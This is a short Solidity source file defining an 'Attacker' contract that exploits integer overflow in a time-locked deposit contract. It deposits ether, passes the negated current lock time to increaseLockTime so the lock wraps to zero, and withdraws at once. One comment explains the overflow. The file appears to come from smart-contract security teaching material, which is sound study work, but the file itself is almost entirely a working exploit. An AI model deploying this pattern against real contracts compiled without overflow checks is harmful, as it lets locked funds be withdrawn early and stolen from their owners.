pragma solidity ^0.6.0;

interface IArithmeticOverUnderFlow {
    function deposit() external payable;
    function increaseLockTime(uint _secondsToIncrease) external;
    function withdraw() external;
    function lockTime(address) external view returns (uint);
}

contract Attacker {
    IArithmeticOverUnderFlow victim;
    
    constructor(address _victim) public {
        victim = IArithmeticOverUnderFlow(_victim);
    }
    
    fallback() external payable {}
    
    function attack() public payable {
        victim.deposit{value: msg.value}();
        victim.increaseLockTime(
            // When uint less than 0, it create underflow, which results in timeLockDuration + (2 ** 256 - timeLockDuration) = overflow = 0
            uint(-victim.lockTime(address(this)))
        );
        victim.withdraw();
    }
}